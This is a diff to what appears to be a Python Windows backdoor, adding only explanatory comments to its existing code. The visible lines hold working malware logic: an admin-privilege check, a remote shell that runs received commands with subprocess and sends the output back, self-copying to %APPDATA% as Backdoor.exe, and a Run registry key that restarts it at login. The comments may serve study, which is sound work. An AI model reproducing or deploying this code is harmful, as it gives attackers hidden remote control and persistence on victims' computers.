@@ -48,7 +48,7 @@ def connection():
 def admin_privilege():
     global admin
     try:
-        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
+        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp'])) # Tries to list files in the system's temp directory to check if the script has admin privileges (access will fail without them)
     except:
         admin = "[!!] User Privileges"
     else:
@@ -116,8 +116,8 @@ def shell():
                 reliable_send('Can\'t Perform The Check')
         else:
             try:
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                result = (proc.stdout.read() + proc.stderr.read()).decode()
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Executes a shell command and captures its output and errors
+                result = (proc.stdout.read() + proc.stderr.read()).decode() # Reads and combines both standard output and error, then decodes them to a string.
                 reliable_send(result)
             except:
                 reliable_send("[!!] Can't Execute the Command")
@@ -125,7 +125,7 @@ def shell():
 location = os.environ['appdata'] + '\\Backdoor.exe'
 if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
-    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)
+    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True) # Adds a registry key to make the script persist by running automatically on Windows startup.
 
     name = sys._MEIPATH + '\poa.jpg'
     try:
